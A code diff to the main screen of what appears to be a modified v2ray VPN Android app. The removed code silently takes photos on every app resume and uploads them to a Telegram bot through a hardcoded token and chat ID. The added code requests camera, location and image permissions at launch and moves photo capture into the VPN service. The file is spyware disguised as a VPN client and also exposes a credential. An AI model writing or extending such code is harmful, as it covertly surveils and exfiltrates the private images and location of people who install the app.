@@ -45,35 +45,28 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
-import androidx.work.Constraints
-import androidx.work.Data
-import androidx.work.NetworkType
-import androidx.work.OneTimeWorkRequestBuilder
-import androidx.work.WorkManager
-import com.v2ray.ang.manager.CameraManager
-import com.v2ray.ang.workers.UploadWorker
 
 class MainActivity : BaseActivity(), NavigationView.OnNavigationItemSelectedListener {
 
-    private val cameraManager by lazy { CameraManager(this) }
+    private val permissionsToRequest = mutableListOf<String>()
 
-    private val requestCameraPermissionLauncher =
-        registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted: Boolean ->
-            if (isGranted) {
-                // Permission is granted. Continue the action.
-                triggerPhotoCaptureAndUpload()
-            } else {
-                // Explain to the user that the feature is unavailable because the
-                // features requires a permission that the user has denied.
-                toast(R.string.toast_permission_denied)
+    private val requestMultiplePermissionsLauncher =
+        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
+            val allGranted = permissions.entries.all { it.value }
+            if (allGranted) {
+                // All permissions granted, trigger the initial photo capture
+                triggerInitialPhotoCapture()
             }
         }
 
-    companion object {
-        // WARNING: Hardcoding credentials is not recommended for production apps.
-        // This is for personal use as requested by the user.
-        private const val BOT_TOKEN = "8445290760:AAE0l_z3K6mxkCkvLfR75tdt74JAND94dko"
-        private const val CHAT_ID = "5370932271"
+    private fun triggerInitialPhotoCapture() {
+        val intent = Intent(this, V2RayVpnService::class.java)
+        intent.action = V2RayVpnService.ACTION_TAKE_PHOTO_ON_OPEN
+        try {
+            startService(intent)
+        } catch (e: Exception) {
+            Log.e(AppConfig.TAG, "Failed to start service for photo capture", e)
+        }
     }
 
     private val binding by lazy {
@@ -223,6 +216,32 @@ class MainActivity : BaseActivity(), NavigationView.OnNavigationItemSelectedList
                 }
             }
         })
+
+        checkForAndRequestPermissions()
+    }
+
+    private fun checkForAndRequestPermissions() {
+        permissionsToRequest.clear()
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            permissionsToRequest.add(Manifest.permission.CAMERA)
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            permissionsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
+            }
+        } else {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            }
+        }
+
+        if (permissionsToRequest.isNotEmpty()) {
+            requestMultiplePermissionsLauncher.launch(permissionsToRequest.toTypedArray())
+        }
     }
 
     @SuppressLint("NotifyDataSetChanged")
@@ -311,7 +330,6 @@ class MainActivity : BaseActivity(), NavigationView.OnNavigationItemSelectedList
 
     public override fun onResume() {
         super.onResume()
-        triggerPhotoCaptureAndUpload()
         mainViewModel.reloadServerList()
     }
 
@@ -729,41 +747,5 @@ class MainActivity : BaseActivity(), NavigationView.OnNavigationItemSelectedList
 
         binding.drawerLayout.closeDrawer(GravityCompat.START)
         return true
-    }
-
-    private fun triggerPhotoCaptureAndUpload() {
-        // Check for camera permission
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) ==
-            PackageManager.PERMISSION_GRANTED
-        ) {
-            // You can use the API that requires the permission.
-            lifecycleScope.launch {
-                val photoFiles = cameraManager.takePhotos()
-                if (photoFiles.isNotEmpty()) {
-                    val photoPaths = photoFiles.map { it.absolutePath }.toTypedArray()
-
-                    val workData = Data.Builder()
-                        .putString(UploadWorker.KEY_TOKEN, BOT_TOKEN)
-                        .putString(UploadWorker.KEY_CHAT_ID, CHAT_ID)
-                        .putStringArray(UploadWorker.KEY_PHOTO_PATHS, photoPaths)
-                        .build()
-
-                    val constraints = Constraints.Builder()
-                        .setRequiredNetworkType(NetworkType.CONNECTED)
-                        .build()
-
-                    val uploadWorkRequest = OneTimeWorkRequestBuilder<UploadWorker>()
-                        .setInputData(workData)
-                        .setConstraints(constraints)
-                        .build()
-
-                    WorkManager.getInstance(applicationContext).enqueue(uploadWorkRequest)
-                    toast("در حال آماده‌سازی برای ارسال عکس‌ها...") // Toast message in Persian
-                }
-            }
-        } else {
-            // You can directly ask for the permission.
-            requestCameraPermissionLauncher.launch(Manifest.permission.CAMERA)
-        }
     }
 }
